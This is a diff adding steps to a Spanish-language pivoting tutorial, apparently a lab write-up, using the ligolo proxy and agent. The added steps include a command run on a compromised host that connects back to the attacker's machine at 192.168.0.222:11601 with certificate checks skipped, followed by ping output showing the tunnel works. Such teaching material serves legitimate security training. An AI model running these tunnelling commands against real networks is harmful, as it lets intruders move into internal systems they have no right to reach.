@@ -45,3 +45,36 @@ Ejecuta:
 ./proxy -selfcert
 ```
 
+```Dato interesante```; El parámetro -selfcert me permite generar y utilizar un certificado TLS autofirmado para establecer una comunicación cifrada entre el Proxy y el Cliente.
+
+### 03. En el host PIVOTE (máquina comprometida)
+
+Tienes que conectar tu archivo cliente (Agent) al servidor Proxy que dejamos ejecutándose en nuestra máquina de ataque. 
+
+Ejecuta: 
+
+```bash
+./Agent -connect 192.168.0.222:11601 -ignore-cert 
+```
+
+```Dato interesante```; El parámetro -ignote-cert omite la validación del certificado TLS del servidor 
+
+
+### 04. Verificación de conectividad
+
+Una vez establecido el túnel, verificamos que podemos alcanzar la dirección 20.20.20.3 a través de la interfaz virtual ligolo.
+
+```
+PING 20.20.20.3 (20.20.20.3) 56(84) bytes of data.
+64 bytes from 20.20.20.3: icmp_seq=1 ttl=64 time=1.24 ms
+64 bytes from 20.20.20.3: icmp_seq=2 ttl=64 time=0.98 ms
+64 bytes from 20.20.20.3: icmp_seq=3 ttl=64 time=1.12 ms
+64 bytes from 20.20.20.3: icmp_seq=4 ttl=64 time=1.05 ms
+
+--- 20.20.20.3 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3005ms
+```
+
+## H4ck the planet, Joseph <3
+
+
